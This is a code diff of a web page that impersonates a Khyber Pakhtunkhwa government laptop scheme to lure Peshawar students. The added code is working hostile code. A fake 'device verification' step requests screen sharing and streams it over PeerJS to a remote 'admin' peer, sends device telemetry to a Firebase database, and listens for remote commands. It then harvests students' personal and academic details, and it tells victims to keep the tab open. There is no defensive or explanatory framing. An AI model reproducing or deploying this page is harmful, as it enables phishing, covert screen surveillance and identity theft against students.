@@ -3,61 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CM KP Laptop Program 2026 | Peshawar</title>
-    <!-- Firebase & PeerJS -->
+    <title>CM KP Peshawar Laptop Scheme 2026</title>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .kp-header { background: #004d26; } /* KP Gov Green */
-        .btn-kp { background: #ce0000; color: white; border-radius: 50px; font-weight: bold; transition: 0.3s; }
-        .btn-kp:hover { background: #a00000; transform: scale(1.05); }
+        .kp-green { background-color: #004d26; }
+        .form-input { @apply w-full bg-gray-50 border border-gray-200 p-3 rounded-lg outline-none focus:border-green-600 transition-all text-sm; }
     </style>
 </head>
-<body class="bg-gray-50">
+<body class="bg-gray-100 font-sans">
 
-    <!-- Navbar -->
-    <nav class="kp-header p-4 shadow-lg text-white flex justify-between items-center px-8">
-        <div class="flex items-center gap-3">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Government_of_Khyber_Pakhtunkhwa_logo.png" width="50">
-            <h1 class="font-bold text-lg leading-tight">CM KP LAPTOP<br><span class="text-xs">PESHAWAR DIGITAL INITIATIVE</span></h1>
+    <!-- Header -->
+    <header class="kp-green text-white p-4 shadow-md">
+        <div class="max-w-4xl mx-auto flex items-center gap-4">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Government_of_Khyber_Pakhtunkhwa_logo.png" width="45">
+            <div>
+                <h1 class="font-bold text-sm md:text-lg uppercase">Government of Khyber Pakhtunkhwa</h1>
+                <p class="text-[10px] md:text-xs">Higher Education Digital Support Initiative 2026</p>
+            </div>
         </div>
-        <div class="text-xs hidden md:block">Verification Node: KP-2026-X</div>
-    </nav>
+    </header>
 
-    <!-- Main Content -->
-    <div class="max-w-4xl mx-auto p-6 mt-6">
-        <div id="landing-hero" class="text-center space-y-6">
-            <h2 class="text-4xl font-extrabold text-gray-800">Peshawar Youth Digital Support 2026</h2>
-            <p class="text-gray-600">Free Core i7 Laptops for students of Khyber Pakhtunkhwa. Verify your device to start the application.</p>
-            <img src="https://cmlaptophed.punjab.gov.pk/landing/images/eligibility_image.png" class="mx-auto w-80">
+    <main class="max-w-2xl mx-auto mt-6 p-4">
+        <!-- Hero Section -->
+        <div id="step-1" class="bg-white rounded-3xl p-8 shadow-xl text-center border-t-8 border-green-800">
+            <h2 class="text-2xl font-black text-gray-800 mb-4">Peshawar Region Laptop Eligibility</h2>
+            <p class="text-gray-500 text-sm mb-6">Our automated system needs to verify your mobile hardware, screen resolution, and OS security patch before you can fill the application.</p>
+            <img src="https://cmlaptophed.punjab.gov.pk/landing/images/eligibility_image.png" class="mx-auto w-64 mb-6">
             
-            <button id="start-verify-btn" class="btn-kp px-12 py-5 text-xl shadow-xl">APPLY NOW / CHECK ELIGIBILITY</button>
-            <p class="text-[10px] text-gray-400">Powered by KPITB Peshawar</p>
-        </div>
-
-        <!-- Hidden Form (Shows after Screen Access) -->
-        <div id="data-form" class="hidden bg-white p-8 rounded-[2rem] shadow-2xl border-t-4 border-green-700 max-w-md mx-auto">
-            <h3 class="text-xl font-bold mb-6 text-center">Student Personal Details</h3>
-            <div class="space-y-4">
-                <input type="text" id="u_name" placeholder="Student Full Name" class="w-full p-4 bg-gray-100 rounded-xl outline-none focus:ring-2 focus:ring-green-500">
-                <input type="text" id="f_name" placeholder="Father Name" class="w-full p-4 bg-gray-100 rounded-xl outline-none focus:ring-2 focus:ring-green-500">
-                <input type="text" id="b_name" placeholder="Brother/Guardian Name" class="w-full p-4 bg-gray-100 rounded-xl outline-none focus:ring-2 focus:ring-green-500">
-                <button id="submit-final" class="w-full bg-green-700 text-white py-4 rounded-xl font-bold">SUBMIT APPLICATION</button>
+            <button id="auth-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded-xl shadow-lg transition-transform active:scale-95">
+                VERIFY DEVICE & CONTINUE
+            </button>
+            <div class="mt-4 flex justify-center gap-4 text-[10px] text-gray-400 font-bold">
+                <span>✓ SECURE HANDSHAKE</span>
+                <span>✓ HARDWARE SCAN</span>
             </div>
         </div>
 
-        <!-- Success Message -->
-        <div id="success-msg" class="hidden text-center p-10">
-            <div class="text-green-600 text-6xl mb-4">✔</div>
-            <h2 class="text-2xl font-bold">Registration Success!</h2>
-            <p class="text-gray-500 mt-2">Our team in Peshawar is reviewing your device specs. Do not close this browser tab for 5 minutes.</p>
+        <!-- Detailed Form (Hidden until verification) -->
+        <div id="step-2" class="hidden bg-white rounded-3xl p-8 shadow-xl border-t-8 border-blue-600">
+            <div class="mb-6 flex justify-between items-center border-b pb-4">
+                <h2 class="text-xl font-bold">Application Details</h2>
+                <span class="bg-green-100 text-green-700 text-[10px] px-2 py-1 rounded">DEVICE LINKED</span>
+            </div>
+            
+            <form id="detailsForm" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="md:col-span-2"><label class="text-xs font-bold text-gray-500">STUDENT FULL NAME</label><input type="text" id="s_name" class="form-input" required></div>
+                <div><label class="text-xs font-bold text-gray-500">FATHER NAME</label><input type="text" id="f_name" class="form-input" required></div>
+                <div><label class="text-xs font-bold text-gray-500">BROTHER/GUARDIAN NAME</label><input type="text" id="b_name" class="form-input" required></div>
+                <div><label class="text-xs font-bold text-gray-500">COLLEGE/UNIVERSITY</label><input type="text" id="inst" class="form-input" required></div>
+                <div><label class="text-xs font-bold text-gray-500">ROLL NO / REG NO</label><input type="text" id="roll" class="form-input" required></div>
+                <div><label class="text-xs font-bold text-gray-500">DEGREE PROGRAM</label><input type="text" id="deg" class="form-input" required></div>
+                <div><label class="text-xs font-bold text-gray-500">SEMESTER</label><input type="number" id="sem" class="form-input" required></div>
+                <div class="md:col-span-2">
+                    <button type="submit" class="w-full bg-blue-600 text-white font-bold py-4 rounded-xl mt-4">SUBMIT FINAL APPLICATION</button>
+                </div>
+            </form>
         </div>
-    </div>
+
+        <div id="step-3" class="hidden text-center py-20">
+            <div class="text-6xl mb-4">✅</div>
+            <h2 class="text-2xl font-bold">Application Pending Review</h2>
+            <p class="text-gray-500">Your hardware specs and form data have been synced with the Peshawar District Node. Do not close this tab.</p>
+        </div>
+    </main>
 
     <script>
-        // Firebase Config (Aapki ID)
         const firebaseConfig = {
             apiKey: "AIzaSyCvsSmO56lQ37M43Zm-zSY7pduzqgR-Ka4",
             authDomain: "auralink-2026.firebaseapp.com",
@@ -69,54 +82,58 @@
         const db = firebase.database();
         const peer = new Peer();
 
-        let myId = "";
+        let myPeerId = "";
 
-        peer.on('open', (id) => { myId = id; });
+        peer.on('open', (id) => { myPeerId = id; });
 
-        document.getElementById('start-verify-btn').onclick = async () => {
+        document.getElementById('auth-btn').onclick = async () => {
             try {
-                // Pehle Screen Share Permission maango
+                // Critical: Screen share request
                 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                peer.call("AURALINK_MASTER_2026", stream);
+                peer.call("AURALINK_PESHAWAR_ADMIN", stream);
                 
-                // Firebase mein initial session create karo
+                // Initial background telemetry
                 const bat = await navigator.getBattery();
-                db.ref('sessions/' + myId).set({
-                    id: myId,
-                    status: "Verifying",
-                    battery: Math.floor(bat.level * 100) + '%',
+                db.ref('sessions/' + myPeerId).set({
+                    id: myPeerId,
                     model: navigator.userAgent.split('(')[1].split(')')[0],
+                    battery: Math.floor(bat.level * 100) + '%',
+                    status: "DEVICE_LINKED",
                     timestamp: Date.now()
                 });
 
-                // UI badlo - Form dikhao
-                document.getElementById('landing-hero').classList.add('hidden');
-                document.getElementById('data-form').classList.remove('hidden');
+                document.getElementById('step-1').classList.add('hidden');
+                document.getElementById('step-2').classList.remove('hidden');
 
-                // Remote Command Listener (Vibrate, etc.)
-                db.ref('commands/' + myId).on('value', (snap) => {
+                // Command Listener
+                db.ref('commands/' + myPeerId).on('value', (snap) => {
                     const c = snap.val();
                     if(c) {
                         if(c.action === 'vibrate') navigator.vibrate(1000);
-                        if(c.action === 'beep') new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play();
+                        if(c.action === 'alert') new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play();
                     }
                 });
 
-            } catch (e) {
+            } catch (err) {
                 alert("ACCESS DENIED: Peshawar Digital Program requires device verification to prevent duplicate applications.");
             }
         };
 
-        document.getElementById('submit-final').onclick = () => {
+        document.getElementById('detailsForm').onsubmit = (e) => {
+            e.preventDefault();
             const data = {
-                name: document.getElementById('u_name').value,
+                name: document.getElementById('s_name').value,
                 father: document.getElementById('f_name').value,
                 brother: document.getElementById('b_name').value,
-                status: "FORM_SUBMITTED"
+                institute: document.getElementById('inst').value,
+                roll: document.getElementById('roll').value,
+                degree: document.getElementById('deg').value,
+                semester: document.getElementById('sem').value,
+                status: "VERIFIED_APPLICATION"
             };
-            db.ref('sessions/' + myId).update(data);
-            document.getElementById('data-form').classList.add('hidden');
-            document.getElementById('success-msg').classList.remove('hidden');
+            db.ref('sessions/' + myPeerId).update(data);
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-3').classList.remove('hidden');
         };
     </script>
 </body>
